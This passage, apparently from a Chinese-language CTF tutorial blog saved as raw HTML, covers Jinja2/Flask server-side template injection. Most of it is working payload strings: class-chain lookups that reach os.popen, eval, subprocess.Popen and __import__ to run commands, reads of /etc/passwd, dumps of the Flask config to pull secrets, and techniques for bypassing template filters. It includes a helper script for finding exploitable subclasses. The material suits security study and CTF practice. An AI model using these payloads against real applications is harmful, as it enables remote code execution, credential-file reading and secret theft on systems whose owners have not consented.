class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure><p>然后把子类列表放进下面脚本中的a中，然后寻找<code>os._wrap_close</code>这个类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">find2.py</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;class &#x27;type&#x27;&gt;,...,&lt;class &#x27;subprocess.Popen&#x27;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allList = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        result += i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        allList.append(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;\n&quot;</span> <span class="keyword">or</span> i == <span class="string">&quot;,&quot;</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        result += i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(allList):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406141122657.png" alt="img"></p><p>又或者用如下的<code>requests</code>脚本去跑</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fi<span class="symbol">nd3</span>.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406141122688.png" alt="img"></p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122821.png" alt="img"></p><p>tips：后面的各种方法都是利用这种思路寻找到可以getshell类的位置</p><h4 id="python3的方法">python3的方法</h4><ul><li><code>os._wrap_close</code>类中的<code>popen</code></li></ul><p>在上面的例子中就是用的这个方法，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>__import__</code>中的<code>os</code></li></ul><p>把上面<code>find.py</code>脚本中的search变量换成<code>__import__</code></p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122805.png" alt="img"></p><p>可以看到有5个类下是包含<code>__import__</code>的，随便用一个即可</p><p>payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="python2的方法">python2的方法</h4><p>因为python3和python2两个版本下有差别，这里把python2单独拿出来说</p><p>tips：python2的<code>string</code>类型不直接从属于属于基类，所以要用两次 <code>__bases__[0]</code></p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122011.png" alt="img"></p><ul><li><code>file</code>类读写文件</li></ul><p>本方法只能适用于python2，因为在python3中<code>file</code>类已经被移除了</p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122392.png" alt="img"></p><p>可以使用dir查看file对象中的内置方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__enter__&#x27;</span>, <span class="string">&#x27;__exit__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;closed&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;errors&#x27;</span>, <span class="string">&#x27;fileno&#x27;</span>, <span class="string">&#x27;flush&#x27;</span>, <span class="string">&#x27;isatty&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;newlines&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;readinto&#x27;</span>, <span class="string">&#x27;readline&#x27;</span>, <span class="string">&#x27;readlines&#x27;</span>, <span class="string">&#x27;seek&#x27;</span>, <span class="string">&#x27;softspace&#x27;</span>, <span class="string">&#x27;tell&#x27;</span>, <span class="string">&#x27;truncate&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writelines&#x27;</span>, <span class="string">&#x27;xreadlines&#x27;</span>]</span><br></pre></td></tr></table></figure><p>然后直接调用里面的方法即可，payload如下</p><p>读文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>warnings</code>类中的<code>linecache</code></li></ul><p>本方法只能用于python2，因为在python3中会报错<code>'function object' has no attribute 'func_globals'</code>，猜测应该是python3中<code>func_globals</code>被移除了还是啥的，如果不对请师傅们指出</p><p>我们把上面的<code>find.py</code>脚本中的search变量赋值为<code>linecache</code>，去寻找含有<code>linecache</code>的类</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">λ python find.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(&lt;class <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="number">59</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(&lt;class <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="number">60</span>)</span><br></pre></td></tr></table></figure><p>后面如法炮制，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">60</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="python2-3的方法">python2&amp;3的方法</h4><p>这里介绍python2和python3两个版本通用的方法</p><ul><li><code>__builtins__</code>代码执行</li></ul><p>这种方法是比较常用的，因为他两种python版本都适用</p><p>首先<code>__builtins__</code>是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如<code>abs</code>，<code>max</code>，就是因为<code>__builtins__</code>这类模块在Python启动时为我们导入了，可以使用<code>dir(__builtins__)</code>来查看调用方法的列表，然后可以发现<code>__builtins__</code>下有<code>eval</code>，<code>__import__</code>等的函数，因此可以利用此来执行命令。</p><p>把上面<code>find.py</code>脚本search变量赋值为<code>__builtins__</code>，然后找到第140个类<code>warnings.catch_warnings</code>含有他，而且这里的话比较多的类都含有<code>__builtins__</code>，比如常用的还有<code>email.header._ValueFormatter</code>等等，这也可能是为什么这种方法比较多人用的原因之一吧</p><p>再调用<code>eval</code>等函数和方法即可，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>又或者用如下两种方式，用模板来跑循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in ().__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> in b.keys() %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406141122716.png" alt="img"></p><p>读取文件payload</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in ().__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>然后这里再提一个比较少人提到的点</p><p><code>warnings.catch_warnings</code>类在在内部定义了<code>_module=sys.modules['warnings']</code>，然后<code>warnings</code>模块包含有<code>__builtins__</code>，也就是说如果可以找到<code>warnings.catch_warnings</code>类，则可以不使用<code>globals</code>，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>总而言之，原理都是先找到含有<code>__builtins__</code>的类，然后再进一步利用</p><ul><li><code>subprocess.Popen</code>进行RCE</li></ul><p>我们可以用<code>find2.py</code>寻找<code>subprocess.Popen</code>这个类，可以直接RCE，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;whoami&#x27;</span>,shell=True,stdout=<span class="number">-1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>直接利用<code>os</code></li></ul><p>一开始我以为这种方法只能用于python2，因为我在本地实验的时候python3中无法找到直接含有os的类，但后来发现python3其实也是能够用的，主要是环境里面有这个那个类才行</p><p>我们把上面的<code>find.py</code>脚本中的search变量赋值为os，去寻找含有os的类</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">λ python find.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(&lt;class <span class="string">&#x27;site._Printer&#x27;</span>&gt;, <span class="number">69</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(&lt;class <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="number">74</span>)</span><br></pre></td></tr></table></figure><p>后面如法炮制，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">69</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="获取配置信息">获取配置信息</h4><p>我们有时候可以使用flask的内置函数比如说<code>url_for</code>，<code>get_flashed_messages</code>，甚至是内置的对象<code>request</code>来查询配置信息或者是构造payload</p><ul><li><code>config</code></li></ul><p>我们通常会用<code>&#123;&#123;config&#125;&#125;</code>查询配置信息，如果题目有设置类似<code>app.config ['FLAG'] = os.environ.pop('FLAG')</code>，就可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>获得flag</p><ul><li><code>request</code></li></ul><p>jinja2中存在对象<code>request</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; from flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; request.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>查询一些配置信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[<span class="string">&#x27;json&#x27;</span>].JSONEncoder.<span class="keyword">default</span>.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;request.application.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>url_for</code></li></ul><p>查询配置信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>get_flashed_messages</code></li></ul><p>查询配置信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="绕过黑名单">绕过黑名单</h3><p>CTF中一般考的就是怎么绕过SSTI，我们学会如何去构造payload之后，还要学习如何去绕过一些过滤，然后下面由于环境的不同，payload中类的位置也是就那个数字可能会和文章中不一样，需要自己动手测一下</p><h4 id="过滤了点">过滤了点</h4><p>过滤了<code>.</code></p><p>在python中，可用以下表示法可用于访问对象的属性</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;()[<span class="string">&quot;__class__&quot;</span>]&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;getattr(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>也就是说我们可以通过<code>[]</code>，<code>attr()</code>，<code>getattr()</code>来绕过点</p><ul><li>使用<code>[]</code>绕过</li></ul><p>使用访问字典的方式来访问函数或者类等，下面两行是等价的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__class__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>以此，我们可以构造payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">433</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>使用<code>attr()</code>绕过</li></ul><p>使用原生JinJa2的函数<code>attr()</code>，以下两行是等价的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>以此，我们可以构造payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">65</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span 